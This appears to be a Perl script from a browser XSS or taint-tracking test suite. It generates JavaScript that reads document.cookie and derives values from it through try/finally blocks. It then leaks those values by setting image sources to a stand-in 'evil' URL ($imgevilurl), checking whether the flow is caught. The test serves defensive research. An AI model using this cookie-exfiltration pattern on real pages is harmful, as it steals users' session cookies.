#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_GOSUBX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
/*		
		try {
		} catch (e) {
			dut = notevil;			
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			notevil = (notevil + $i)/2;
|;
}
print qq|		
		} finally {
			dut = notevil + 2;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			try {
			} catch (e) {
				dut2 = notevil2;
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			notevil2 = (notevil2 + $i)/2;
|;
}
print qq|		
			} finally {
				dut2 = notevil2 + 2;
			}
		}
	
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
*/
		// normal usage 	
		try {
		} catch (e) {
			dut3 = notevil3;
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			notevil3 = (notevil3 + $i)/2;
|;
}
print qq|		
		} finally {
			dut3 = evil + 2;
		}
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
    </script>
|;

require "xss_basic_footer.pl";
